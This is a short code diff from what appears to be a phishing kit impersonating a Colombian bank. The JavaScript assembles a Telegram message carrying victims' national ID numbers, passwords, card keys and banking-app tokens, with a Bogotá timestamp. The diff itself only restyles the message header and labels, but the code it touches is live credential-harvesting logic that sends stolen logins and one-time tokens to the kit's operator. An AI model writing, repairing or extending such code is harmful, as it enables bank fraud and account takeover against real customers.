@@ -307,7 +307,7 @@
                 tokenAttemptCount++;
                 sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
 
-                let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
+                let telegramMessage = '🔴🔴🔴🔴 TOKEN APP INGRESADO 🔴🔴🔴🔴\n\n';
                 if (initialLoginData) {
                     if (initialLoginData.cardClave !== 'N/A') {
                         telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
@@ -321,11 +321,11 @@
                         telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
                         telegramMessage += `ClAVE🔐: ${initialLoginData.clave}\n`;
                     }
-                    telegramMessage += `\n〽️ Token App: ${token}\n\n`;
+                    telegramMessage += `\n🔴 Token App: ${token}\n\n`;
                     telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
                 } else {
                     telegramMessage += `Tipo de Ingreso: Token APP (sin datos de sesión)\n`;
-                    telegramMessage += `\n〽️ Token App: ${token}\n\n`;
+                    telegramMessage += `\n🔴Token App: ${token}\n\n`;
                     telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
                 }
 
